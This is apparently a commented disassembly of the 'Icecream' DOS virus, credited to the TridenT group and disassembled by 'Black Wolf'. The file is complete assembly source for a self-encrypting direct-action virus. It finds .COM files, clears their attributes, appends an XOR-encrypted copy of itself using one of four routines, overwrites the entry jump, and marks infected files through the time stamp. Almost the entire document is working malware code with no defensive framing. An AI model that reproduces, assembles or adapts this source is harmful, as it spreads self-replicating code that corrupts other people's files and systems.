;Icecream Virus by the TridenT virus research group.

;This is a simple direct-action com virus that uses one of
;4 encryption algorithms to encrypt itself each time it infects a file.
;It will infect one .COM file in the current directory every time it is 
;executed.  It marks infections with the time stamp.


;Disassembly by Black Wolf

.model tiny                
.code
		org     100h
  
start:
		db      0e9h,0ch,0       ;jmp     Virus_Entry

Author_Name     db      'John Tardy'
		
		db      0E2h,0FAh
Virus_Entry:
		push    ax
		call    Get_Offset
Get_Offset:
		pop     ax
		sub     ax,offset Get_Offset

		db      89h,0c5h         ;mov     bp,ax
		lea     si,[bp+Storage]
		mov     di,100h                 ;Restore file
		movsw
		movsb

		mov     ah,1Ah
		mov     dx,0f900h
		int     21h                     ;Set DTA
			   
		mov     ah,4Eh

FindFirstNext:
		lea     dx,[bp+ComMask]
		xor     cx,cx
		int     21h                     ;Find File
		jnc     InfectFile

Restore_DTA:
		mov     ah,1Ah
		mov     dx,80h
		int     21h                     ;Set DTA to default
			   
		mov     bx,offset start
		pop     ax                      ;Return to host
		push    bx
		retn

InfectFile:
		mov     ax,4300h
		mov     dx,0f91eh
		int     21h                     ;Get file attribs
			  
		push    cx                      ;save 'em
		mov     ax,4301h
		xor     cx,cx
		int     21h                     ;Set them to 0
			   
		mov     ax,3D02h
		int     21h                     ;Open file
			   
		mov     bx,5700h
		xchg    ax,bx
		int     21h                     ;Get file time
			   
		push    cx
		push    dx                      ;save it
		and     cx,1Fh
		cmp     cx,1                    ;check for infection
		jne     ContinueInfection
		db      0e9h,69h,0              ;jmp     DoneInfect

ContinueInfection:
		mov     ah,3Fh
		lea     dx,[bp+Storage]
		mov     cx,3
		int     21h                     ;Read in first 3 bytes
			   
		mov     ax,cs:[Storage+bp]
		cmp     ax,4D5Ah                ;Is it an EXE?
		je      DoneInfect
		cmp     ax,5A4Dh
		je      DoneInfect              ;Other EXE signature?
		
		pop     dx
		pop     cx
		and     cx,0FFE0h               ;Change stored time values
		or      cx,1                    ;to mark infection
		push    cx
		push    dx
		
		mov     ax,4202h                ;Go to the end of the file
		call    Move_FP
		sub     ax,3
		mov     cs:[JumpSize+bp],ax        ;Save jump size

		add     ax,10Fh                    ;Save encryption starting
		mov     word ptr [bp+EncPtr1+1],ax ;point....
		mov     word ptr [bp+EncPtr2+1],ax
		mov     word ptr [bp+EncPtr3+1],ax
		mov     word ptr [bp+EncPtr4+1],ax
		call    SetupEncryption            ;Encrypt virus

		mov     ah,40h
		mov     dx,0fa00h
		mov     cx,1F5h
		int     21h                     ;Write virus to file
			   
		mov     ax,4200h
		call    Move_FP                 ;Go to the beginning of file

		mov     ah,40h        
		lea     dx,[bp+JumpBytes]
		mov     cx,3
		int     21h                     ;Write in jump
			   
		call    FinishFile
		jmp     Restore_DTA

DoneInfect:
		call    FinishFile
		mov     ah,4Fh
		jmp     FindFirstNext
  
Move_FP:
		xor     cx,cx
		xor     dx,dx
		int     21h
		ret

FinishFile:
		pop     si dx cx
		mov     ax,5701h                ;Reset file time/date stamp
		int     21h                     ;(or mark infection)

		mov     ah,3Eh
		int     21h                     ;Close new host file
						
		mov     ax,4301h
		pop     cx
		mov     dx,0fc1eh
		int     21h                     ;Restore old attributes
			   
		push    si
		retn

Message         db      ' I scream, you scream, we both '
		db      'scream for an ice-cream! '
  
SetupEncryption:
		xor     byte ptr [bp+10Dh],2
		xor     ax,ax
		mov     es,ax
		mov     ax,es:[46ch]            ;Get random number
		push    cs
		pop     es
		push    ax
		and     ax,7FFh
		add     ax,1E9h
		mov     word ptr [bp+EncSize1+1],ax
		mov     word ptr [bp+EncSize2+1],ax
		mov     word ptr [bp+EncSize3+1],ax
		mov     word ptr [bp+EncSize4+1],ax
		pop     ax
		push    ax
		and     ax,3
		shl     ax,1
		mov     si,ax
		mov     ax,[bp+si+EncData1]
		add     ax,bp
		mov     si,ax
		lea     di,[bp+103h] 
		movsw
		movsw
		movsw
		movsw                   ;Copy Encryption Algorithm
		pop     ax
		stosb
		movsb
		mov     dl,al
		lea     si,[bp+103h]
		mov     di,0fa00h   
		mov     cx,0Ch
		rep     movsb       
		lea     si,[bp+10Fh]
		mov     cx,1E9h
  
EncryptVirus:
		lodsb               
		db      30h,0d0h                ;xor     al,dl
		stosb               
		loop    EncryptVirus   
  
		cmp     dl,0
		je      KeyWasZero
		retn

KeyWasZero:                                     ;If key is zero, increase
		mov     si,offset AuthorName    ;jump size and place name
		mov     di,0fa00h               ;at beginning....
		mov     cx,0Ah
		rep     movsb           
		mov     ax,cs:[JumpSize+bp]
		add     ax,0Ch
		mov     cs:[JumpSize+bp],ax
		retn

		db      '[TridenT]'
		
EncData1        dw      02beh
EncData2        dw      02c7h
EncData3        dw      02d0h
EncData4        dw      02d9h

Encryptions:                                
;------------------------------------------------------------                
EncPtr1:
		mov     si,0
EncSize1:
		mov     cx,0
		xor     byte ptr [si],46h
;------------------------------------------------------------                
EncPtr2:                
		mov     di,0
EncSize2:
		mov     cx,0
		xor     byte ptr [di],47h
;------------------------------------------------------------
EncSize3:
		mov     cx,0
EncPtr3:                
		mov     si,0
		xor     byte ptr [si],46h
;------------------------------------------------------------                
EncSize4:
		mov     cx,0
EncPtr4:                
		mov     di,0
		xor     byte ptr [di],47h
;------------------------------------------------------------                

AuthorName      db      'John Tardy'

JumpBytes       db      0E9h
JumpSize        dw      0               

ComMask         db      '*.CoM',0

Storage         dw      20CDh           
		db      21h

end     start
